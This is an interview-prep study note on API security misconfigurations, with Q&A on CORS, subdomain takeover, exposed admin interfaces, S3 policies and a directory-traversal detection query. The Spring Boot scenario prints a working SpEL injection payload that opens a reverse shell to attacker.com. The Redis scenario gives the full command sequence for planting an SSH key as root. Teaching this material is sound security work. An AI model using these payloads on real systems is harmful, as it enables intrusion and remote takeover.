---
tags: [interview, api-security, qna, scenario]
difficulty: expert
module: "Interview Prep - API Security"
topic: "QnA - API Module 38"
---

# Threat Hunting & Offensive Engineering: Security Misconfiguration

## Custom ASCII Diagram

```text
    [ Internet Periphery ]                       [ Internal Cloud Environment ]
             |
             |  1. Attacker Scans Exposed Assets
             |====================================>  [ Exposed Spring Boot Actuator ]
             |                                          (Misconfigured /heapdump)
             |
             |  2. Downloads Heap Dump
             |<====================================
             |
[ Offline Analysis ]
  - Parse memory dump
  - Extract DB Credentials
  - Extract JWT Secrets
             |
             |  3. Direct Database Connection
             |====================================>  [ Internal PostgreSQL DB ]
             |                                          (Misconfigured Security Group: 0.0.0.0/0)
             |
             |  4. Data Exfiltration
             |<====================================
             |
[ Complete Compromise ]
```

## Formal Technical Questions

### Q1: What makes CORS (Cross-Origin Resource Sharing) misconfigurations dangerous, and how do attackers weaponize them?
**Answer:**
CORS is a browser security mechanism that relaxes the Same-Origin Policy (SOP), allowing a web application to request resources from a different domain. A misconfiguration occurs when the server relies on a flawed regex or blindly reflects the `Origin` header from the client into the `Access-Control-Allow-Origin` (ACAO) response header.

**Weaponization:**
If a server returns `Access-Control-Allow-Origin: https://attacker.com` and `Access-Control-Allow-Credentials: true`, an attacker can host a malicious script on `attacker.com`. When an authenticated victim visits the attacker's site, the script sends an AJAX request to the vulnerable application. Because the browser sees the permissive ACAO header, it allows the attacker's script to read the sensitive response (e.g., fetching private account details or CSRF tokens), leading to cross-origin data theft.

### Q2: Discuss the implications of "Dangling DNS" and how it leads to Subdomain Takeover.
**Answer:**
Dangling DNS occurs when a DNS record (usually a CNAME) points to a third-party resource (like an AWS S3 bucket, a GitHub Pages site, or a Heroku app) that has been deprovisioned or deleted, but the DNS record is left intact in the organization's zone file.

**Implications:**
An attacker who identifies this dangling record can register the missing resource on the third-party provider using the exact name specified in the CNAME. Once registered, the attacker completely controls the content served under the target organization's trusted subdomain. This enables highly credible phishing campaigns, the theft of domain-scoped cookies, and the bypassing of CORS policies that inherently trust subdomains.

### Q3: Why do default credentials and exposed administrative interfaces persist in modern deployments, and how should a Threat Hunter identify them?
**Answer:**
Despite best practices, default credentials persist due to rapid deployment cycles, the use of unhardened base container images, and a lack of automated posture management. Often, developers deploy services like Redis, RabbitMQ, or Tomcat for debugging in staging environments and accidentally push these configurations to production.

**Threat Hunting Approach:**
Hunters should not rely solely on external vulnerability scanners. 
1. **Network Telemetry**: Analyze VPC flow logs for anomalous administrative port traffic (e.g., 6379, 15672, 8080) originating from the internet or untrusted internal segments.
2. **Log Analysis**: Query centralized logs for default application usernames (e.g., `admin`, `guest`, `root`) successfully authenticating, particularly from IP addresses outside the corporate VPN or bastion host ranges.
3. **Banner Grabbing Logs**: Monitor SIEM alerts for Shodan/Censys scanners successfully grabbing HTTP banners that disclose detailed framework versions (e.g., `X-Powered-By: Express`, `Server: Apache/2.4.41`).

## Scenario-Based Questions

### Q1: You are on a Red Team engagement. You discover an exposed Spring Boot application with the `/actuator/env` and `/actuator/gateway/routes` endpoints accessible without authentication. How do you leverage this misconfiguration to achieve Remote Code Execution (RCE)?
**Answer:**
Exposed Spring Boot Actuators are a goldmine for misconfigurations. If `/actuator/env` is accessible, it means I can read environment variables, which often contain AWS keys, database passwords, or internal API tokens.

However, to escalate to RCE using the `/actuator/gateway/routes` endpoint (assuming Spring Cloud Gateway is in use):
1. **Route Injection**: I will send an HTTP POST request to `/actuator/gateway/routes/pwned` to create a new route.
2. **Payload Delivery**: Within the JSON body of the POST request, I will inject a malicious Spring Expression Language (SpEL) payload into the filter logic. For example:
   ```json
   {
     "id": "pwned",
     "filters": [{
       "name": "AddResponseHeader",
       "args": {
         "name": "Result",
         "value": "#{new java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash -i >& /dev/tcp/attacker.com/4444 0>&1\").start()}"
       }
     }],
     "uri": "http://example.com"
   }
   ```
3. **Triggering Execution**: I will send a POST request to `/actuator/gateway/refresh` to force the application to reload the routes and evaluate the SpEL payload.
4. **Catching the Shell**: The SpEL expression executes natively on the underlying host, granting me a reverse shell on my listening netcat server.

### Q2: As a Blue Team analyst, you detect multiple HTTP GET requests returning 403 Forbidden errors to an S3 bucket URL, followed by a sudden burst of 200 OK responses to the same bucket from an unknown IP. What misconfiguration likely caused this, and how did the attacker exploit it?
**Answer:**
This pattern strongly suggests the exploitation of a misconfigured IAM policy or S3 Bucket Policy, specifically regarding "Authenticated Users" versus "Public Users".

**The Misconfiguration:**
The attacker initially encountered 403 Forbidden errors when trying to access the bucket anonymously. However, AWS has a legacy conceptual trap: the `Authenticated Users` group. If a bucket policy grants read access to `Authenticated Users`, it does *not* mean authenticated users *within your organization*. It means *any user with a valid AWS account anywhere in the world*.

**The Exploitation:**
1. The attacker realized anonymous access was blocked (the 403s).
2. They configured their local AWS CLI with their own personal, unrelated AWS account credentials.
3. They re-ran the query: `aws s3 ls s3://target-bucket --profile personal-account`.
4. Because the misconfigured bucket allowed any "Authenticated User", AWS authorized the request. The burst of 200 OK responses indicates the attacker successfully listed and downloaded the bucket's contents using their external credentials.

## Deep-Dive Defensive Questions

### Q1: Write an Elasticsearch (KQL) or SIEM query to detect potential exploitation of directory traversal misconfigurations via web logs.
**Answer:**
Directory traversal exploits rely on dot-dot-slash (`../`) sequences to escape the web root and access sensitive files like `/etc/passwd` or `C:\Windows\win.ini`. Attackers often use URL encoding (`%2e%2e%2f`) or double encoding to bypass basic WAF rules.

```kql
index=web_logs 
AND (
  url.path: *../* OR 
  url.path: *%2e%2e%2f* OR 
  url.path: *%252e%252e%252f* OR 
  url.path: *..%5c* OR 
  url.query: *etc/passwd* OR 
  url.query: *win.ini*
)
AND http.response.status_code: [200 TO 299]
```
This query looks for raw, single-encoded, and double-encoded traversal patterns in both the URL path and query parameters. Crucially, it filters for HTTP 200-level status codes, indicating that the server likely processed the request successfully and returned the sensitive file, alerting the analyst to a successful breach rather than just scanner noise.

### Q2: How does implementing "Security Posture Management" (CSPM/KSPM) tools prevent misconfigurations at scale?
**Answer:**
Security Posture Management tools shift the focus from reactive detection to proactive infrastructure validation.
In modern cloud-native environments, infrastructure is defined as code (Terraform, CloudFormation). Misconfigurations happen when a developer commits a flawed template (e.g., exposing port 22 to `0.0.0.0/0`).

CSPM tools prevent this by:
1. **Continuous Scanning**: Constantly evaluating the live cloud environment against compliance frameworks (CIS, NIST) and internal baselines, immediately flagging open S3 buckets, missing encryption, or permissive security groups.
2. **Shift-Left Integration**: Integrating into the CI/CD pipeline. When a developer pushes a Terraform plan, the CSPM engine parses it before deployment. If the plan introduces a critical misconfiguration (like disabling MFA on root accounts), the pipeline automatically fails, preventing the misconfiguration from ever reaching production.
3. **Automated Remediation**: Some tools can automatically revert unauthorized changes, utilizing Lambda functions to close exposed ports seconds after they are opened by a rogue process or uninformed admin.

## Real-World Attack Scenario

**The Exposed Redis leading to RCE**

During a critical infrastructure assessment, the target company utilized an in-memory Redis instance for session caching.

**The Flaw:**
The Redis instance was bound to `0.0.0.0` (accessible globally) and lacked a password (`requirepass` was not set in `redis.conf`). This is a critical security misconfiguration.

**The Attack:**
1. **Discovery**: A mass-can of the target's IP space revealed port 6379 open.
2. **Connection**: The attacker connected directly using `redis-cli -h target_ip`.
3. **Exploitation via SSH Keys**: The attacker generated a local SSH keypair.
4. They flushed the public key into the Redis memory: `set backup1 "\n\nssh-rsa AAAAB3N... attacker\n\n"`
5. They then abused Redis's misconfigured directory privileges to change the database backup path to the root user's SSH directory:
   `config set dir /root/.ssh/`
   `config set dbfilename authorized_keys`
6. Finally, they issued the `save` command. Redis dumped its memory (containing the attacker's public key) into the `/root/.ssh/authorized_keys` file.
7. **RCE Achieved**: The attacker successfully executed `ssh root@target_ip`, gaining immediate, unauthenticated remote code execution on the underlying server.

## Chaining Opportunities

- **Misconfigured CORS + XSS**: Using a reflected XSS vulnerability to pivot and steal data across origins via excessively permissive CORS headers.
- **Verbose Error Messages + SQLi**: Leveraging misconfigured debug pages (like Django Debug mode) to read exact database schema errors, turning a blind SQLi into an error-based SQLi.
- **Default Credentials + Deserialization**: Logging into a Jenkins or Tomcat admin panel using default credentials to upload a malicious `.war` file or trigger Java deserialization attacks.
- **Open Buckets + Phishing**: Hosting malware on a misconfigured, highly trusted corporate S3 bucket to bypass email security gateways.

## Related Notes
- [[08 - Exploiting Spring Boot Actuators]]
- [[19 - Cloud Security Posture Management]]
- [[27 - Advanced Subdomain Takeover Strategies]]
- [[41 - CI-CD Pipeline Security]]
